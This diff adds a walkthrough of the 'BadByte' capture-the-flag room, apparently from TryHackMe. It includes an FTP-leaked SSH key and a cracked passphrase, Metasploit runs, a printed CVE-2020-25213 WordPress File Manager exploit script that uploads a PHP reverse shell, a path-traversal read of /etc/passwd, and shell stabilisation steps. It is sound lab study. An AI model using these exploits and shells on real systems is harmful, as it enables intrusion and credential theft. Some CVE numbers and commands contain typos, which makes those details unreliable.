@@ -1,0 +1,1040 @@
+BADBYTE.
+
+
+
+
+TASK 1: DEPLOY THE MACHINE:
+Nothing to do here.
+
+
+
+
+TASK 2: RECONAISSANCE:
+2.1. HOW MANY PORTS ARE OPEN?
+Piped command to return just the number of open ports:
+nmap -p- 10.10.87.14 | grep "open" | wc -l
+OUTPUT:
+2
+Answer:
+2
+
+
+
+2.2. WHAT SERVICE IS RUNNING ON THE LOWEST OPEN PORT?
+Nmap quick all port scan:
+nmap -p- -sS -T4 -sV 10.10.87.14
+OUTPUT:
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+30024/tcp open  ftp     vsftpd 3.0.5
+Service Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel
+Note:
+on port 22, ssh is running.
+Answer:
+ssh
+
+
+
+2.3. WHAT NON-STANDARD PORT IS OPEN?
+Based on last question output. Answer:
+30024
+
+
+
+2.4. WHAT SERVICE IS RUNNING ON THE NON-STANDARD PORT?
+Based on question 2.2 output. Answer:
+ftp
+
+
+
+
+TASK 3: FOOTHOLD:
+3.1. WHAT USERNAME DO WE FIND DURING THE ENUMERATION PROCESS?
+Note:
+The question clues us to the fact we are missing some info. We can't really do anything to ssh, so we will try anon login on ftp.
+Ftp connection:
+ftp 10.10.87.14 30024
+Note:
+Use credential pair: Name=anonymous, Password="". We manage to log in.
+
+
+List directory:
+ls
+OUTPUT:
+-rw-r--r--    1 ftp      ftp          1743 Mar 23  2021 id_rsa
+-rw-r--r--    1 ftp      ftp            78 Mar 23  2021 note.txt
+
+
+Download all files:
+mget id_rsa note.txt
+Note:
+a when prompted [anpqy?]? to download all.
+
+
+Read note:
+cat note.txt
+OUTPUT:
+I always forget my password. Just let me store an ssh key here.
+- errorcauser
+Note:
+It was already our guess, but this note confirms we got an ssh key.
+Also, we got the username of the owner: errorcauser.
+Answer:
+errorcauser
+
+
+
+3.2. WHAT IS THE PASSPHRASE FOR THE RSA PRIVATE KEY?
+Convert rsa key to hash:
+ssh2john id_rsa > found_ssh_hash.txt
+
+
+Crack hash: 
+john --wordlist=thm/rockyou.txt found_ssh_hash.txt 
+OUTPUT:
+cupcake          (id_rsa)     
+Answer:
+cupcake
+
+
+
+
+TASK 4: PORT FORWARDING:
+4.1. WHAT MAIN TCP PORTS ARE LISTENING ON LOCALHOST?
+Note:
+Doing some research, we find relevant commands that match the hint's syntax.
+Ssh port forwarding syntax (password login):
+ssh -D [local_port] [user]@[remote_host]
+SSh port forwading syntax (key login):
+ssh -i [key_path] -D [local_port] [user]@[remote_host]
+
+
+Note:
+Looks like the room wants us to use port 1337.
+Our ssh dynamic port forwarding command:
+ssh -i id_rsa -D 1337 errorcauser@10.10.87.14
+
+
+Before running, we need to give proper restricted permissions to the key:
+chmod 600 id_rsa
+
+
+Note:
+errorcauser's password is cupcake.
+Run ssh dynamic port forwarding:
+ssh -i id_rsa -D 1337 errorcauser@10.10.87.14
+Note:
+Since this ssh session is just used for port forwarding, it can be backgrounded.
+
+
+Configure proxychains (attacker):
+1. Edit file: sudo nano /etc/proxychains.conf
+2. If it's your first proxy: add it under a new line wih text [ProxyList].
+3. Add new line: socks5 127.0.0.1 1337
+
+
+Check file changes:
+cat /etc/proxychains.conf
+OUTPUT:
+[ProxyList]
+# socks5 proxy
+socks5 127.0.0.1 1337
+
+
+Confirm socks5 proxy is working:
+proxychains curl http://127.0.0.1
+OUTPUT:
+[proxychains] config file found: /etc/proxychains.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] Dynamic chain  ...  127.0.0.1:1337  ...  127.0.0.1:80  ...  OK
+<!doctype html>
+<html lang="en-GB" >
+<head>
+	<meta charset="UTF-8" />
+	<meta name="viewport" content="width=device-width, initial-scale=1" />
+	<title>BadByte &#8211; You&#039;re looking at me, but they are looking at you..</title>
+<link rel='dns-prefetch' href='//localhost' />
+<link rel='dns-prefetch' href='//s.w.org' />
+<link rel="alternate" type="application/rss+xml" title="BadByte &raquo; Feed" href="http://localhost/?feed=rss2" />
+<link rel="alternate" type="application/rss+xml" title="BadByte &raquo; Comments Feed" href="http://localhost/?feed=comments-rss2" />
+		<script>
+			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/12.0.0-1\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/12.0.0-1\/svg\/","svgExt":".svg","source":{"concatemoji":"http:\/\/localhost\/wp-includes\/js\/wp-emoji-release.min.js?ver=5.3.2"}};
+			!function(e,a,t){var r,n,o,i,p=a.createElement("canvas"),s=p.getContext&&p.getContext("2d");function c(e,t){var a=String.fromCharCode;s.clearRect(0,0,p.width,p.height),s.fillText(a.apply(this,e),0,0);var r=p.toDataURL();return s.clearRect(0,0,p.width,p.height),s.fillText(a.apply(this,t),0,0),r===p.toDataURL()}function l(e){if(!s||!s.fillText)return!1;switch(s.textBaseline="top",s.font="600 32px Arial",e){case"flag":return!c([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])&&(!c([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!c([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]));case"emoji":return!c([55357,56424,55356,57342,8205,55358,56605,8205,55357,56424,55356,57340],[55357,56424,55356,57342,8203,55358,56605,8203,55357,56424,55356,57340])}return!1}function d(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(i=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},o=0;o<i.length;o++)t.supports[i[o]]=l(i[o]),t.supports.everything=t.supports.everything&&t.supports[i[o]],"flag"!==i[o]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[i[o]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(r=t.source||{}).concatemoji?d(r.concatemoji):r.wpemoji&&r.twemoji&&(d(r.twemoji),d(r.wpemoji)))}(window,document,window._wpemojiSettings);
+		</script>
+		<style>
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+	<link rel='stylesheet' id='wp-block-library-css'  href='http://localhost/wp-includes/css/dist/block-library/style.min.css?ver=5.3.2' media='all' />
+<link rel='stylesheet' id='wp-block-library-theme-css'  href='http://localhost/wp-includes/css/dist/block-library/theme.min.css?ver=5.3.2' media='all' />
+<link rel='stylesheet' id='twenty-twenty-one-style-css'  href='http://localhost/wp-content/themes/twentytwentyone/style.css?ver=1.2' media='all' />
+<link rel='stylesheet' id='twenty-twenty-one-print-style-css'  href='http://localhost/wp-content/themes/twentytwentyone/assets/css/print.css?ver=1.2' media='print' />
+<link rel='https://api.w.org/' href='http://localhost/index.php?rest_route=/' />
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://localhost/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://localhost/wp-includes/wlwmanifest.xml" /> 
+<meta name="generator" content="WordPress 5.3.2" />
+<style>.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style></head>
+
+<body class="home blog wp-embed-responsive is-light-theme no-js hfeed">
+<div id="page" class="site">
+	<a class="skip-link screen-reader-text" href="#content">Skip to content</a>
+
+	
+<header id="masthead" class="site-header has-title-and-tagline" role="banner">
+
+	
+
+<div class="site-branding">
+
+	
+						<h1 class="site-title">BadByte</h1>
+			
+			<p class="site-description">
+			You&#039;re looking at me, but they are looking at you..		</p>
+	</div><!-- .site-branding -->
+	
+
+</header><!-- #masthead -->
+
+	<div id="content" class="site-content">
+		<div id="primary" class="content-area">
+			<main id="main" class="site-main" role="main">
+
+<article id="post-1" class="post-1 post type-post status-publish format-standard hentry category-uncategorised entry">
+
+	
+<header class="entry-header">
+	<h2 class="entry-title default-max-width"><a href="http://localhost/?p=1">Welcome to Badbyte</a></h2></header><!-- .entry-header -->
+
+	<div class="entry-content">
+		<p>Welcome to Badbyte. The place where we hack the planet.</p>
+	</div><!-- .entry-content -->
+
+	<footer class="entry-footer default-max-width">
+		<span class="posted-on">Published <time class="entry-date published updated" datetime="2021-03-23T19:02:51+00:00">23 March 2021</time></span><div class="post-taxonomies"><span class="cat-links">Categorised as <a href="http://localhost/?cat=1" rel="category">Uncategorised</a> </span></div>	</footer><!-- .entry-footer -->
+</article><!-- #post-${ID} -->
+			</main><!-- #main -->
+		</div><!-- #primary -->
+	</div><!-- #content -->
+
+	
+	<aside class="widget-area">
+		<section id="search-2" class="widget widget_search"><form role="search"  method="get" class="search-form" action="http://localhost/">
+	<label for="search-form-1">Search&hellip;</label>
+	<input type="search" id="search-form-1" class="search-field" value="" name="s" />
+	<input type="submit" class="search-submit" value="Search" />
+</form>
+</section>		<section id="recent-posts-2" class="widget widget_recent_entries">		<h2 class="widget-title">Recent Posts</h2>		<ul>
+									<li>
+					<a href="http://localhost/?p=1">Welcome to Badbyte</a>
+									</li>
+					</ul>
+		</section><section id="recent-comments-2" class="widget widget_recent_comments"><h2 class="widget-title">Recent Comments</h2><ul id="recentcomments"><li class="recentcomments"><span class="comment-author-link"><a href='https://wordpress.org/' rel='external nofollow ugc' class='url'>A WordPress Commenter</a></span> on <a href="http://localhost/?p=1#comment-1">Welcome to Badbyte</a></li></ul></section>	</aside><!-- .widget-area -->
+
+
+	<footer id="colophon" class="site-footer" role="contentinfo">
+
+				<div class="site-info">
+			<div class="site-name">
+									BadByte									</div><!-- .site-name -->
+			<div class="powered-by">
+				Proudly powered by <a href="https://en-gb.wordpress.org/">WordPress</a>.			</div><!-- .powered-by -->
+
+		</div><!-- .site-info -->
+	</footer><!-- #colophon -->
+
+</div><!-- #page -->
+
+<script>document.body.classList.remove("no-js");</script>	<script>
+	if ( -1 !== navigator.userAgent.indexOf( 'MSIE' ) || -1 !== navigator.appVersion.indexOf( 'Trident/' ) ) {
+		document.body.classList.add( 'is-IE' );
+	}
+	</script>
+	<script>
+( Element.prototype.matches && Element.prototype.closest && window.NodeList && NodeList.prototype.forEach ) || document.write( '<script src="http://localhost/wp-content/themes/twentytwentyone/assets/js/polyfills.js?ver=1.2"></scr' + 'ipt>' );
+</script>
+<script src='http://localhost/wp-content/themes/twentytwentyone/assets/js/responsive-embeds.js?ver=1.2'></script>
+<script src='http://localhost/wp-includes/js/wp-embed.min.js?ver=5.3.2'></script>
+	<script>
+	/(trident|msie)/i.test(navigator.userAgent)&&document.getElementById&&window.addEventListener&&window.addEventListener("hashchange",(function(){var t,e=location.hash.substring(1);/^[A-z0-9_-]+$/.test(e)&&(t=document.getElementById(e))&&(/^(?:a|select|input|button|textarea)$/i.test(t.tagName)||(t.tabIndex=-1),t.focus())}),!1);
+	</script>
+	
+</body>
+</html>
+Note:
+It's working properly.
+
+
+Scan internal ports on server (via proxychains):
+Note:
+Remember to run as sudo (forgot that).
+sudo nmap -sT 127.0.0.1
+OUTPUT:
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+3306/tcp open  mysql
+Answer:
+80,3306
+
+
+
+4.2. WHAT PROTOCOLS ARE USED FOR THESE PORTS?
+From last question. Answer:
+http, mysql
+
+
+
+
+TASK 5: WEB EXPLOITATION:
+5.1. WHAT CMS IS RUNNING ON THE MACHINE?
+Local port forwarding (local 8080 to remote 80, so we can visit the website):
+ssh -i id_rsa -L 8080:127.0.0.1:80 errorcauser@10.10.203.116
+
+
+Visiting the site:
+http://127.0.0.1:8080/
+OUTPUT:
+Skip to content
+BadByte
+You're looking at me, but they are looking at you..
+
+Welcome to Badbyte
+Welcome to Badbyte. The place where we hack the planet.
+
+Published 23 March 2021
+Categorised as Uncategorised
+Search… 
+ 
+Recent Posts
+Welcome to Badbyte
+Recent Comments
+A WordPress Commenter on Welcome to Badbyte
+BadByte
+Proudly powered by WordPress.
+Answer:
+wordpress
+Note:
+v5.3.2
+
+
+
+5.2. CAN YOU FIND ANY VULNERABLE PLUGINS?
+Note:
+To enumerate wordpress related plugins, themes, and users, we will use the nse script: http-wordpress-enum
+sudo nmap -p 8080 --script http-wordpress-enum --script-args http-wordpress-enum.url=/,http-wordpress-enum.enumerate=plugins 127.0.0.1
+OUTPUT:
+PORT     STATE SERVICE
+8080/tcp open  http-proxy
+| http-wordpress-enum: 
+| Search limited to top 100 themes/plugins
+|   plugins
+|     akismet
+|_    duplicator 1.3.26
+Note:
+Plugins displayed are those installed on target. Doesn't imply they are vulnerable, we need to do that research ourselves.
+
+
+
+5.3. WHAT IS THE CVE NUMBER FOR DIRECTORY TRAVERSAL VULNERABILITY?
+Researching directory traversel exploits for duplicator 1.3.26, we find:
+cve-2020-11738
+
+
+
+5.4. WHAT IS THE CVE NUMBER FOR REMOTE CODE EXECUTION VULNERABILITY?
+Researcing wordpress file rce 2020, we find:
+cve-2020-2513
+
+
+
+5.5. THERE IS A METASPLOIT MODULE FOR THE EXPLOIT. YOU CAN USE IT TO GET THE REVERSE SHELL. IF YOU ARE FEELING LUCKY YOU CAN FOLLOW ANY POC (PROOF OF CONCEPT):
+Start metasploit:
+msfconsole
+
+
+Look for the rce exploit:
+search cve:2020-25213
+OUTPUT:
+Matching Modules
+================
+
+   #  Name                                    Disclosure Date  Rank    Check  Description
+   -  ----                                    ---------------  ----    -----  -----------
+   0  exploit/multi/http/wp_file_manager_rce  2020-09-09       normal  Yes    WordPress File Manager Unauthenticated Remote Code Execution
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/wp_file_manager_rce
+
+
+Use the found module:
+use 0
+OUTPUT: 
+[*] Using configured payload php/meterpreter/reverse_tcp
+msf6 exploit(multi/http/wp_file_manager_rce) > 
+
+
+Check paremeters to fill in:
+show options
+OUTPUT:
+Module options (exploit/multi/http/wp_file_manager_rce):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   COMMAND    upload           yes       elFinder commands used to exp
+                                         loit the vulnerability (Accep
+                                         ted: upload, mkfile+put)
+   Proxies                     no        A proxy chain of format type:
+                                         host:port[,type:host:port][..
+                                         .]. Supported proxies: sapni,
+                                          socks4, socks5, socks5h, htt
+                                         p
+   RHOSTS                      yes       The target host(s), see https
+                                         ://docs.metasploit.com/docs/u
+                                         sing-metasploit/basics/using-
+                                         metasploit.html
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoin
+                                         g connections
+   TARGETURI  /                yes       Base path to WordPress instal
+                                         lation
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface
+                                     may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   WordPress File Manager 6.0-6.8
+
+
+
+View the full module info with the info, or info -d command.
+Note:
+It looks like it won't work in our version, since we are running v5.3.2. But we might as well try.
+
+Note:
+IMPORTANT: since we are port forwarding, we are targeting 127.0.0.1:8080, NOT 10.10.203.116
+Parameter setup:
+set RHOSTS 127.0.0.1
+set TARGETURI /
+set LHOST 10.23.25.109
+set LPORT 4444
+
+
+Run exploit:
+run
+OUTPUT:
+msf6 exploit(multi/http/wp_file_manager_rce) > run
+[*] Started reverse TCP handler on 10.23.25.109:4444 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[-] Exploit aborted due to failure: unknown: Cannot reliably check exploitability. "set ForceExploit true" to override check result.
+[*] Exploit completed, but no session was created.
+Note:
+Unsurprisingly, the exploit didn't work. We don't have the plugin file manager installed, nor the required wordpress version running. But this served as a practice exercise.
+
+
+Searching for the first cve we found:
+search cve:2020-11738
+
+OUTPUT:
+Matching Modules
+================
+
+   #  Name                                            Disclosure Date  Rank    Check  Description
+   -  ----                                            ---------------  ----    -----  -----------
+   0  auxiliary/scanner/http/wp_duplicator_file_read  2020-02-19       normal  No     WordPress Duplicator File Read Vulnerability
+
+
+Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/http/wp_duplicator_file_read
+
+
+Use the module:
+use 0
+
+
+Check parameters:
+show options
+OUTPUT:
+Module options (auxiliary/scanner/http/wp_duplicator_file_read):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   DEPTH      5                yes       Traversal Depth (to reach the
+                                          root folder)
+   FILEPATH   /etc/passwd      yes       The path to the file to read
+   Proxies                     no        A proxy chain of format type:
+                                         host:port[,type:host:port][..
+                                         .]. Supported proxies: sapni,
+                                          socks4, socks5, socks5h, htt
+                                         p
+   RHOSTS                      yes       The target host(s), see https
+                                         ://docs.metasploit.com/docs/u
+                                         sing-metasploit/basics/using-
+                                         metasploit.html
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoin
+                                         g connections
+   TARGETURI  /                yes       The base path to the wordpres
+                                         s application
+   THREADS    1                yes       The number of concurrent thre
+                                         ads (max one per host)
+   VHOST                       no        HTTP server virtual host
+
+
+Note:
+We will keep depth at 5, since it is enough to reach /etc/passwd (our main target).
+Also, /etc/passwd is already set as our target path (option FILEPATH).
+
+
+Set options:
+set RHOSTS 127.0.0.1
+set ROPORT 8080
+
+
+Run exploit:
+run
+OUTPUT:
+[*] Downloading file...
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+cth:x:1000:1000:cth:/home/cth:/bin/bash
+mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false
+errorcauser:x:1001:1001::/home/errorcauser:/bin/bash
+ftp:x:112:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
+systemd-timesync:x:113:116:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+tss:x:114:117:TPM software stack,,,:/var/lib/tpm:/bin/false
+tcpdump:x:115:120::/nonexistent:/usr/sbin/nologin
+usbmux:x:116:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+fwupd-refresh:x:117:121:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+ubuntu:x:1002:1003:Ubuntu:/home/ubuntu:/bin/bash
+
+
+[+] File saved in: /home/user0/.msf4/loot/20250720094549_default_127.0.0.1_duplicator.trave_157254.txt
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+
+
+5.6. WHAT IS THE NAME OF USER THAT WAS RUNNING CMS?
+Filter last question result for users with home directories:
+grep "home" /home/user0/.msf4/loot/20250720094549_default_127.0.0.1_duplicator.trave_157254.txt
+OUTPUT:
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+cth:x:1000:1000:cth:/home/cth:/bin/bash
+errorcauser:x:1001:1001::/home/errorcauser:/bin/bash
+ubuntu:x:1002:1003:Ubuntu:/home/ubuntu:/bin/bash
+Answer:
+cth
+
+
+5.7. WHAT IS THE USER FLAG?
+Note:
+We could try to just read the flag directly using our exploit, but since we will need to privesc later, we might as well try to gain user access now.
+Get password hashes:
+set FILEPATH /etc/shadow
+run
+OUTPUT:
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+Note:
+We don't get any file output (can check manually on the ~/.msf4/loot directory) because unlike /etc/passwd, that is world-readable, /etc/shadow is only readable by root.
+
+
+Note:
+Question 5.5 says to use a metasploit module to get a reverse shell (which we should have tried to avoid wasting all this time in the first place).
+Search for akismet exploits:
+search akismet:
+OUTPUT: [-] No results from search
+
+
+Search for duplicator exploits:
+Matching Modules
+================
+
+   #  Name                                            Disclosure Date  Rank    Check  Description
+   -  ----                                            ---------------  ----    -----  -----------
+   0  exploit/multi/php/wp_duplicator_code_inject     2018-08-29       manual  Yes    Snap Creek Duplicator WordPress plugin code injection
+   1  auxiliary/scanner/http/wp_duplicator_file_read  2020-02-19       normal  No     WordPress Duplicator File Read Vulnerability
+
+
+Interact with a module by name or index. For example info 1, use 1 or use auxiliary/scanner/http/wp_duplicator_file_read
+
+
+Use module 0:
+use 0
+
+Show options:
+show options
+OUTPUT:
+msf6 exploit(multi/php/wp_duplicator_code_inject) > show options
+
+Module options (exploit/multi/php/wp_duplicator_code_inject):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   Proxies                     no        A proxy chain of format type:
+                                         host:port[,type:host:port][..
+                                         .]. Supported proxies: sapni,
+                                          socks4, socks5, socks5h, htt
+                                         p
+   RHOSTS                      yes       The target host(s), see https
+                                         ://docs.metasploit.com/docs/u
+                                         sing-metasploit/basics/using-
+                                         metasploit.html
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoin
+                                         g connections
+   TARGETURI  /installer.php   yes       The TARGETURI where installer
+                                         .php or installer-backup.php
+                                         is located
+   TIMEOUT    40               yes       Timeout for web requests
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface
+                                     may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   WordPress Duplicator <= 1.2.40
+
+
+
+View the full module info with the info, or info -d command.
+
+Note:
+ssl stays false, since our curl has header: HTTP/1.1 200 OK (it uses http, not https, so no ssl).
+Settings:
+set RPORT 8080
+set LHOST 10.23.25.109
+SET RHOSTS 127.0.0.1
+
+
+Run exploit:
+run
+OUTPUT:
+[*] Started reverse TCP handler on 10.23.25.109:4444 
+[*] Checking if the wp-config.php file already exists...
+[*] All good! Injecting PHP code in the wp-config.php file...
+[-] Failed to inject PHP code in wp-config.php...
+[*] Exploit completed, but no session was created.
+
+
+Check if /installer.php is accesible:
+curl http://127.0.0.1:8080/installer.php
+OUTPUT:
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL was not found on this server.</p>
+<hr>
+<address>Apache/2.4.41 (Ubuntu) Server at 127.0.0.1 Port 8080</address>
+</body></html>
+Note:
+No. And same result for /installer-backup.php
+
+
+Note:
+Now out of ideas, we read the clue for question 5.5.
+We visit and download the exploit linked:
+https://github.com/electronforce/py2to3/blob/main/CVE-2020-25213.py
+
+
+We run it to see usage:
+python3 CVE-2020-25213.py
+OUTPUT:
+[?] Usage
+[!] python3 exploit.py http://www.targetip.com/ shell.php
+Note:
+Looks like we need to add our own php reverse shell I will this one from pentestmonkey: https://pentestmonkey.net/tools/web-shells/php-reverse-shell. We change ip and port variables to: 10.23.25.109, 44444.
+IMPORTANT:
+The exploit seems to exploit the file manager plugin, so our plugin scan was lacking part of the output.
+
+
+We check the script to see how it works:
+cat CVE-2020-25213.py
+OUTPUT:
+# Exploit Title: WordPress Plugin Wp-FileManager 6.8 - RCE
+# Date: 10th March, 2021
+# Script Author: led
+# CVE: CVE-2020-25213
+# Version Affected: 6.0 to 6.8
+# Vendor URL: https://wordpress.org/plugins/wp-file-manager/
+
+# Refrences:
+#1. https://www.wordfence.com/blog/2020/09/700000-wordpress-users-affected-by-zero-day-vulnerability-in-file-manager-plugin/
+#2. https://seravo.com/blog/0-day-vulnerability-in-wp-file-manager/
+
+# Usage:
+# nc -lvnp $LISTENER_PORT
+# python3 exploit.py http://$TARGET_IP/ shell.php 
+# Use pentest monkey php reverse shell
+import requests, json, sys
+try:
+    url = sys.argv[1]
+    shell = sys.argv[2]
+except:
+    print("[?] Usage")
+    print("[!] python3 exploit.py http://www.targetip.com/ shell.php")
+    quit()
+
+target_endpoint = f"{url}/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
+user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36"
+
+headers = {
+    "User-Agent": user_agent,
+    "Accept": "*/*",
+    "Connection": "close"
+}
+
+data = {
+    "cmd" : "upload", 
+    "target" : "l1_", 
+}
+files = {
+    'upload[0]': open(f'{shell}', 'rb'),
+}
+
+def checkWPFileManager():
+    res = requests.get(target_endpoint, headers=headers)
+    error = res.json()['error'][0]
+    if error == "errUnknownCmd":
+        print(f"[+] {url} is vulnerable")
+        return True
+    else:
+        print(f"[-] {url} is not vulnerable")
+        return False
+
+def uploadWPFileManager():
+        print("[*] Uploading the shell")
+        res_up = requests.post(target_endpoint, headers=headers, data=data, files=files, verify=False)
+        if res_up.status_code == 200:
+            print("[+] Shell Uploaded successfully")
+        else:
+            print("[-] Shell could not be uploaded")
+
+def exploitWPFileManager():
+    vuln = checkWPFileManager()
+    if vuln == True:
+        uploadWPFileManager()
+        new_endpoint = f"{url}/wp-content/plugins/wp-file-manager/lib/files/{shell}"
+        try:
+            res_exp = requests.get(new_endpoint, headers=headers, timeout=7)
+        except requests.Timeout :
+            print('[*] Timeout....Shutting Down')
+            quit()
+    else:
+        print("[-] Exploit was not successful")
+        quit()
+
+
+Copy our php shell (and then change as explained before):
+cp ~/thm/scripts/shell/pentest_monkey/php-reverse-shell.php ./shell.php
+
+
+Run exploit:
+python3 CVE-2020-25213.py http://127.0.0.1:8080/ shell.php
+OUTPUT:
+[+] http://127.0.0.1:8080/ is vulnerable
+[*] Uploading the shell
+[+] Shell Uploaded successfully
+[*] Timeout....Shutting Down
+
+
+Find user flag:
+find / -name user.txt 2>/dev/null
+OUTPUT:
+/home/cth/user.txt
+
+
+Read flag:
+cat /home/cth/user.txt
+OUTPUT:
+THM{227906201d17d9c45aa93d0122ea1af7}
+Answer:
+THM{227906201d17d9c45aa93d0122ea1af7}
+
+
+
+
+TASK 6: PRIVILEGE ESCALATION:
+6.1. WHAT IS THE USER'S OLD PASSWORD?
+Stabilize shell:
+1. Spawn python tty shell: python3 -c 'import pty; pty.spawn("/bin/bash")'
+2. Background current shell: CTRL + Z
+3. Set terminal to raw mod and bring netcat from background: stty raw -echo; fg
+4. Write anything to see the $ prompt again.
+Note:
+Now we can CTRL + C out of any command we run on our shell. Without stabilization, it would end our shell too.
+
+
+Note:
+We are asked to find his old password, so we will run find with some likely keywords:
+find / -type f -iname "*.txt" \( -iname "*note*" -o -iname "*password*" -o -iname "*important*" \) 2>/dev/null
+OUTPUT:
+/home/errorcauser/note.txt
+/usr/lib/python3/dist-packages/twisted/internet/iocpreactor/notes.txt
+/var/ftp/pub/note.txt
+
+
+Read errorcauser's note:
+cat /home/errorcauser/note.txt
+OUTPUT:
+Hi Error!
+I've set up a webserver locally so no one outside could access it.
+It is for testing purposes only.  There are still a few things I need to do like setting up a custom theme.
+You can check it out, you already know what to do.
+-Cth
+:)
+Note:
+Nothing interesting here.
+Also, the ftp note is the one we found previously, so we got no clues.
+
+
+To be able to run clear:
+export TERM=xterm
+
+
+Look for ssh logs:
+grep -ril "ssh" /var/log 2>/dev/null
+OUTPUT:
+/var/log/installer/subiquity-debug.log.1996
+/var/log/installer/installer-journal.txt
+/var/log/installer/subiquity-info.log.1996
+/var/log/alternatives.log.1
